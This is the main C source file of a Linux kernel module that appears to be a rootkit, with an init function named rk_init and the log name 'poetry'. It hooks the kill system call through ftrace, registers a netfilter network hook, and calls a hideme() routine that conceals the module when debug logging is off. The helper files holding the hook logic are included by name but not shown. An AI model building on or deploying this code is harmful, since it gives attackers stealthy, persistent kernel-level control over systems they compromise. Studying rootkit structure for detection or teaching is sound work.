#include "ftrace_hook.h"
#include "kill.c"
#include "netfilter.c"

int debug=1;
static struct ftrace_hook hooks[] = {
        HOOK("sys_kill", hook_kill, &orig_kill),
};

static int __init rk_init(void){

    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    if (debug == 1)
    {
        printk(KERN_INFO "poetry: loaded\n");
    }
    else 
    {
        hideme();
    }

    nf_register_net_hook(&init_net, &my_nfin);

    return 0;
}

static void __exit rk_cleanup(void){
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    nf_unregister_net_hook(&init_net, &my_nfin);

    if (debug == 1)
    {
        printk(KERN_INFO "poetry: unloaded\n");
    }
}

module_init(rk_init);
module_exit(rk_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("kindtime");
MODULE_DESCRIPTION("Kernel Module");
